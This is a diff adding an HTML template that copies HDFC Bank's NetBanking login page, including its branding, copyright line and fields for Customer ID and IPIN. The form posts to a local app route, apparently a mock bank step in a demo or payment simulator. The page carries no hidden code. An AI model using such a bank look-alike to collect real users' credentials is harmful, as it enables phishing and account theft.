@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en" xmlns:th="http://www.w3.org/1999/xhtml">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HDFC Bank NetBanking</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700;900&display=swap');
+
+        body {
+            font-family: 'Lato', sans-serif;
+        }
+
+        .bg-hdfc-primary {
+            background-color: #004c8f;
+        }
+
+        .text-hdfc-primary {
+            color: #004c8f;
+        }
+
+        .border-hdfc-primary {
+            border-color: #004c8f;
+        }
+
+        .focus\:ring-hdfc-primary:focus {
+            --tw-ring-color: #004c8f;
+        }
+
+        .hover\:bg-hdfc-dark:hover {
+            background-color: #003a6d;
+        }
+
+        .bg-hdfc-secondary {
+            background-color: #083c6e;
+        }
+
+        .bg-hdfc-blue {
+            background-color: #0065b3;
+        }
+
+        .text-hdfc-blue {
+            color: #0065b3;
+        }
+    </style>
+</head>
+
+<body class="bg-gray-50 min-h-screen flex flex-col">
+    <!-- Header -->
+    <header class="border-b border-gray-200 bg-white shadow-sm">
+        <div class="container mx-auto px-4 py-3">
+            <div class="flex justify-between items-center">
+                <!-- Logo -->
+                <div class="flex items-center">
+                    <img th:src="@{/hdfc/img.png}" alt="HDFC Bank Logo" class="h-8">
+                </div>
+
+                <span class="ml-2 text-xl font-bold">Login</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="flex-grow flex items-center justify-center py-8 px-4">
+        <div class="w-full max-w-md">
+            <!-- Login Card -->
+            <div class="bg-white rounded-xl shadow-lg overflow-hidden">
+                <!-- Card Header -->
+                <div class="bg-hdfc-primary text-white p-6">
+                    <h2 class="text-2xl font-bold">Login to NetBanking</h2>
+                    <p class="text-gray-200 mt-1">Secure access to your accounts</p>
+                </div>
+
+                <!-- Card Body -->
+                <div class="p-6">
+
+                    <!-- Login Form -->
+                    <form name="hdfcLoginForm" class="space-y-5" method="post" autocomplete="off"
+                        th:action="@{/bank/login/{bankName}/{userId}(bankName=${bankName}, userId=${userId})}">
+                        <!-- Username Field -->
+                        <div>
+                            <label for="username" class="block text-sm font-medium text-gray-700 mb-1">
+                                Customer ID / User ID <span class="text-red-600">*</span>
+                            </label>
+                            <div class="relative">
+                                <input type="text" id="username" name="userName" required maxlength="65"
+                                    class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-hdfc-primary focus:border-transparent"
+                                    placeholder="Enter your Customer ID" autocomplete="off">
+                                <div class="absolute right-3 top-3 text-gray-400">
+                                    <i class="fas fa-user" aria-hidden="true"></i>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Password Field -->
+                        <div>
+                            <label for="password" class="block text-sm font-medium text-gray-700 mb-1">
+                                IPIN (Password) <span class="text-red-600">*</span>
+                            </label>
+                            <div class="relative">
+                                <input type="password" id="password" name="password" required minlength="6"
+                                    maxlength="64"
+                                    class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-hdfc-primary focus:border-transparent pr-10"
+                                    placeholder="Enter your IPIN" autocomplete="off">
+                                <button type="button" id="togglePassword"
+                                    class="absolute right-3 top-3 text-gray-400 hover:text-gray-600"
+                                    aria-label="Toggle password visibility">
+                                    <i class="fas fa-eye" aria-hidden="true"></i>
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- Terms & Conditions -->
+                        <div class="flex items-start">
+                            <input type="checkbox" id="terms" class="mt-1 mr-2" checked disabled>
+                            <label for="terms" class="text-sm text-gray-600">
+                                I agree to the <a href="#" class="text-hdfc-primary hover:underline">terms &
+                                    conditions</a> of HDFC Bank NetBanking
+                            </label>
+                        </div>
+
+                        <!-- Forgot Links -->
+                        <div class="flex justify-between text-sm">
+                            <a href="#" class="text-hdfc-primary hover:underline">Forgot Customer ID?</a>
+                            <a href="#" class="text-hdfc-primary hover:underline">Forgot IPIN?</a>
+                        </div>
+
+                        <!-- Login Button -->
+                        <button type="submit"
+                            class="w-full bg-hdfc-primary text-white py-3 rounded-lg font-semibold hover:bg-hdfc-dark transition-colors">
+                            LOGIN
+                        </button>
+                    </form>
+
+                    <!-- Additional Options -->
+                    <div class="mt-6 pt-6 border-t border-gray-200">
+                        <p class="text-center text-gray-600 mb-4">New to NetBanking?</p>
+                        <button
+                            class="w-full border border-hdfc-primary text-hdfc-primary py-2 rounded-lg font-medium hover:bg-hdfc-primary hover:text-white transition-colors">
+                            REGISTER NOW
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Important Information -->
+            <div class="mt-8 bg-white rounded-xl shadow-lg p-6">
+                <h3 class="text-lg font-bold text-hdfc-primary mb-4 flex items-center">
+                    <i class="fas fa-exclamation-circle mr-2"></i>
+                    Important Information
+                </h3>
+
+                <ul class="space-y-3 text-sm text-gray-600">
+                    <li class="flex items-start">
+                        <i class="fas fa-circle text-hdfc-primary text-xs mt-1 mr-2"></i>
+                        <span>Never reveal your IPIN to anyone</span>
+                    </li>
+                    <li class="flex items-start">
+                        <i class="fas fa-circle text-hdfc-primary text-xs mt-1 mr-2"></i>
+                        <span>Log out of NetBanking when you complete your banking</span>
+                    </li>
+                    <li class="flex items-start">
+                        <i class="fas fa-circle text-hdfc-primary text-xs mt-1 mr-2"></i>
+                        <span>Do not use public computers to access NetBanking</span>
+                    </li>
+                    <li class="flex items-start">
+                        <i class="fas fa-circle text-hdfc-primary text-xs mt-1 mr-2"></i>
+                        <span>Update your contact details regularly for transaction alerts</span>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-hdfc-secondary text-white py-6 mt-8">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col md:flex-row justify-between items-center">
+                <div class="mb-4 md:mb-0">
+                    <p class="text-sm">&copy; 2025 HDFC Bank Ltd. All rights reserved.</p>
+                </div>
+
+                <div class="flex space-x-6">
+                    <a href="#" class="text-sm hover:text-gray-300 transition-colors">Terms and Conditions</a>
+                    <a href="#" class="text-sm hover:text-gray-300 transition-colors">Privacy Policy</a>
+                    <a href="#" class="text-sm hover:text-gray-300 transition-colors">Security Tips</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Toggle password visibility
+        document.getElementById('togglePassword')?.addEventListener('click', function () {
+            const passwordInput = document.getElementById('password');
+            const icon = this.querySelector('i');
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                icon.classList.replace('fa-eye', 'fa-eye-slash');
+            } else {
+                passwordInput.type = 'password';
+                icon.classList.replace('fa-eye-slash', 'fa-eye');
+            }
+        });
+
+        // Submit on Enter in password field
+        document.getElementById('password')?.addEventListener('keydown', function (e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                this.form && this.form.submit();
+            }
+        });
+
+        // Tab switching functionality
+        const tabs = document.querySelectorAll('button[aria-selected]');
+        tabs.forEach(tab => {
+            tab.addEventListener('click', function () {
+                tabs.forEach(t => {
+                    t.setAttribute('aria-selected', 'false');
+                    t.classList.remove('bg-hdfc-primary', 'text-white');
+                    t.classList.add('text-gray-600');
+                });
+                this.setAttribute('aria-selected', 'true');
+                this.classList.add('bg-hdfc-primary', 'text-white');
+                this.classList.remove('text-gray-600');
+
+                // Update form labels based on selected tab
+                const usernameLabel = document.querySelector('label[for="username"]');
+                const passwordLabel = document.querySelector('label[for="password"]');
+
+                if (this.textContent.includes('Card Number')) {
+                    usernameLabel.innerHTML = 'Card Number <span class="text-red-600">*</span>';
+                    document.getElementById('username').placeholder = 'Enter your Card Number';
+                    passwordLabel.innerHTML = 'IPIN (Password) <span class="text-red-600">*</span>';
+                } else {
+                    usernameLabel.innerHTML = 'Customer ID / User ID <span class="text-red-600">*</span>';
+                    document.getElementById('username').placeholder = 'Enter your Customer ID';
+                    passwordLabel.innerHTML = 'IPIN (Password) <span class="text-red-600">*</span>';
+                }
+            });
+        });
+    </script>
+</body>
+
+</html>
